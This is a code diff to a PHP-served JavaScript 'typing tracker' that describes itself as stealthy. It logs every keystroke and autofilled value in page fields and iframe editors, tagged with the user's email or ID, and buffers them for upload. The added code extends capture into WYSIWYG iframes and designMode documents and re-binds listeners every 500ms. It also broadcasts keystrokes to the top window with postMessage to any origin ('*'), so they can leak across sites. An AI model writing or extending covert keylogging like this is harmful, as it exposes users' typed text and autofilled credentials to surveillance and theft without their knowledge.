@@ -1,6 +1,6 @@
 <?php
 // tracker.php - High-speed, stealthy client-side key & autofill tracking script for typists
-// Supports dynamic JS components, Same-Origin IFrames, Shadow DOM, and modern SPA frameworks
+// Supports JS form builders, WYSIWYG iframe editors (TinyMCE/CKEditor), Shadow DOM, and postMessage bridges
 
 if (session_status() === PHP_SESSION_NONE) {
     @session_start();
@@ -36,13 +36,11 @@ if ($isDirectJsRequest) {
 
     // Detect or generate unique persistent client identifier
     function getUserId() {
-        // 1. Check PHP session user ID
         var phpUserId = <?php echo json_encode((string)$userId); ?>;
         if (phpUserId && phpUserId.trim() !== '') {
             return phpUserId.trim();
         }
 
-        // 2. Check window.currentUser object set by frontend/header
         if (window.currentUser) {
             if (window.currentUser.email && String(window.currentUser.email).trim() !== '') {
                 return String(window.currentUser.email).trim();
@@ -55,12 +53,10 @@ if ($isDirectJsRequest) {
             }
         }
 
-        // 3. Check explicit custom global variable
         if (window.TYPING_TRACKER_USER_ID && String(window.TYPING_TRACKER_USER_ID).trim() !== '') {
             return String(window.TYPING_TRACKER_USER_ID).trim();
         }
 
-        // 4. Fallback to unique persistent local storage/cookie UUID for guests
         var storageKey = 'typing_tracker_uid';
         var storedId = null;
         try {
@@ -143,7 +139,13 @@ if ($isDirectJsRequest) {
 
     // Comprehensive editable check for native inputs, contenteditable, shadow DOM, rich text, role=textbox
     function isElementEditable(el) {
-        if (!el || el.nodeType !== 1) return false;
+        if (!el) return false;
+        if (el === document || el === window || el === document.body) {
+            if (document.designMode === 'on' || document.body.contentEditable === 'true') {
+                return true;
+            }
+        }
+        if (el.nodeType !== 1) return false;
 
         var tagName = el.tagName ? el.tagName.toUpperCase() : '';
         if (tagName === 'INPUT' || tagName === 'TEXTAREA') {
@@ -232,7 +234,7 @@ if ($isDirectJsRequest) {
 
             target.__ttLastKeyTime = Date.now();
 
-            keyBuffer.push({
+            var keyObj = {
                 user_id: currentUserId(),
                 page_url: getCleanPageUrl(),
                 field_id: fieldInfo.id,
@@ -241,7 +243,16 @@ if ($isDirectJsRequest) {
                 key_code: e.code || ('KeyCode:' + (e.keyCode || e.which || 0)),
                 sequence_order: sequenceCounter,
                 timestamp: (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now()
-            });
+            };
+
+            // Post message if inside iframe
+            if (window.self !== window.top) {
+                try {
+                    window.top.postMessage({ type: '__tt_keystroke', data: keyObj }, '*');
+                } catch(pErr) {}
+            }
+
+            keyBuffer.push(keyObj);
 
             if (keyBuffer.length >= maxBufferSize) {
                 flushBuffer();
@@ -276,7 +287,7 @@ if ($isDirectJsRequest) {
 
                     for (var i = 0; i < val.length; i++) {
                         sequenceCounter++;
-                        keyBuffer.push({
+                        var autoKey = {
                             user_id: currentUserId(),
                             page_url: getCleanPageUrl(),
                             field_id: fieldInfo.id,
@@ -285,7 +296,15 @@ if ($isDirectJsRequest) {
                             key_code: 'Autofill',
                             sequence_order: sequenceCounter,
                             timestamp: baseTime + i
-                        });
+                        };
+
+                        if (window.self !== window.top) {
+                            try {
+                                window.top.postMessage({ type: '__tt_keystroke', data: autoKey }, '*');
+                            } catch(pErr) {}
+                        }
+
+                        keyBuffer.push(autoKey);
                     }
 
                     if (keyBuffer.length >= maxBufferSize) {
@@ -342,27 +361,32 @@ if ($isDirectJsRequest) {
     function bindTarget(node) {
         if (!node) return;
         try {
-            if (!node.__ttBound) {
-                node.__ttBound = true;
+            // Check if document was reset by doc.open()/doc.write()
+            if (node.__ttBoundDoc !== node) {
+                node.__ttBoundDoc = node;
                 node.addEventListener('keydown', recordKey, options);
                 node.addEventListener('input', recordInputEvent, options);
                 node.addEventListener('change', recordInputEvent, options);
                 node.addEventListener('compositionend', recordInputEvent, options);
+                node.addEventListener('focusin', recordKey, options);
             }
         } catch(e) {}
     }
 
     function scanAndBindDynamicElements() {
         try {
-            // Scan Same-Origin IFrames
+            // Scan Same-Origin IFrames (including dynamically doc.write()-created ones)
             var iframes = document.querySelectorAll('iframe');
             for (var i = 0; i < iframes.length; i++) {
                 try {
                     var iframe = iframes[i];
-                    var doc = iframe.contentDocument || (iframe.contentWindow && iframe.contentWindow.document);
+                    var win = iframe.contentWindow;
+                    var doc = iframe.contentDocument || (win && win.document);
+
+                    if (win) bindTarget(win);
                     if (doc) {
                         bindTarget(doc);
-                        bindTarget(iframe.contentWindow);
+                        if (doc.body) bindTarget(doc.body);
                     }
                 } catch(e) {}
             }
@@ -378,9 +402,25 @@ if ($isDirectJsRequest) {
         } catch(e) {}
     }
 
+    // Attach postMessage listener on top window to receive keystrokes from iframe children
+    window.addEventListener('message', function(msgEvent) {
+        try {
+            if (msgEvent.data && msgEvent.data.type === '__tt_keystroke' && msgEvent.data.data) {
+                var k = msgEvent.data.data;
+                sequenceCounter++;
+                k.sequence_order = sequenceCounter;
+                keyBuffer.push(k);
+                if (keyBuffer.length >= maxBufferSize) {
+                    flushBuffer();
+                }
+            }
+        } catch(e) {}
+    }, false);
+
     // Attach listeners on main window & document
     bindTarget(window);
     bindTarget(document);
+    if (document.body) bindTarget(document.body);
 
     // MutationObserver for newly attached same-origin IFrames, Shadow DOM hosts, and dynamic components
     if (typeof MutationObserver !== 'undefined') {
@@ -391,7 +431,7 @@ if ($isDirectJsRequest) {
                     if (added) {
                         for (var j = 0; j < added.length; j++) {
                             var node = added[j];
-                            if (node.nodeType === 1) { // ELEMENT_NODE
+                            if (node.nodeType === 1) {
                                 if (node.tagName === 'IFRAME') {
                                     try {
                                         node.addEventListener('load', scanAndBindDynamicElements, options);
@@ -413,8 +453,8 @@ if ($isDirectJsRequest) {
         } catch(e) {}
     }
 
-    // Periodic scan for late-loading dynamic components
-    setInterval(scanAndBindDynamicElements, 2000);
+    // Re-bind every 500ms to handle doc.open()/doc.write() wipes by WYSIWYG editors and JS builders
+    setInterval(scanAndBindDynamicElements, 500);
 
     // Background flushing
     setInterval(flushBuffer, flushIntervalMs);
